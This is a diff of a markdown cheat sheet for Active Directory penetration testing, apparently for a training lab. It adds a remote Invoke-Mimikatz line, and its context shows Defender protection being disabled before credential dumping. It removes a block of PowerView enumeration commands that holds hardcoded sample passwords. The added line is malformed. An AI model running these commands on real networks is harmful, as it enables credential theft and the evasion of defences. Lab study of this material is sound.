@@ -38,6 +38,7 @@ $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
 Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
 Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
 Invoke-command -ScriptBlock {Invoke-Mimikatz} -Session $sess
+Invoke-Command --ScriptBlock ${function:Invoke-Mimikatz} -ComputerName
 Enter-PSSession $sess
 ```
 
@@ -103,77 +104,7 @@ Invoke-BloodHound -CollectionMethod All -ExcludeDC
 - [PowerView](https://github.com/lwierzbicki/PowerSploit/tree/master/Recon)
 - [PowerSploit](https://powersploit.readthedocs.io)
 
-Get all the users
-```powershell
-Get-NetUser
-Get-NetUser | select -ExpandProperty samaccountname
-$user = "usfun\db1user"
-$pass = ConvertTo-SecureString -String "Vjltv1Enivad1232" -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user, $pass
-$SecPassword = ConvertTo-SecureString 'Welcome2015' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('PWNY\jar-jar.binks', $SecPassword)
-Get-NetUser -Credential $Cred | Format-Table name, samaccountname, userprincipalname, description
-Get-NetUser -Username student1
-Get-UserProperty -Properties pwdlastset
-Find-UserField -SearchField Description -SearchTerm "built"
-```
 
-Get OU
-```powershell
-Get-NetOU
-Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
-```
-
-Get GPO
-```powershell
-Get-NetGPO
-(Get-NetOU StudentMachines -FullData).gplink
-Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'
-Get-NetGPO -GPOName "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"
-Get-GPO -Guid [objectguid]
-Find-GPOComputerAdmin - Computername dcorp-student1.dollarcorp.moneycorp.local
-Find-GPOLocation -UserName student1 -Verbose
-```
-
-Get ACLs
-```powershell
-Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
-Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs | Format-Table IdentityReference,ActiveDirectoryRights,AccessControlType
-Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
-Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student"}
-Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
-```
-
-Get Domain Data
-```powershell
-Get-NetDomain
-Get-NetDomain -Domain moneycorp.local
-Get-DomainSID
-Get-DomainPolicy
-(Get-DomainPolicy)."system access"
-(Get-DomainPolicy -domain moneycorp.local)."system access"
-Get-NetDomainController -Domain moneycorp.local
-```
-
-Enumerate all domains in the current forest and their trust
-```powershell
-Get-NetForestDomain -Verbose
-Get-NetDomainTrust
-Get-NetForestDomain -Verbose | Get-NetDomainTrust
-Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
-Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
-Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust
-```
-
-Check local admin priv on any other machines
-```powershell
-Invoke-UserHunter -CheckAccess
-```
-
-Go hunting for active user sessions
-```powershell
-Invoke-UserHunter -showall -Credential $cred -ComputerName workstation04 | Format-Table -Property userdomain, username,computername, ipaddress
-```
 
 
 ### Attack
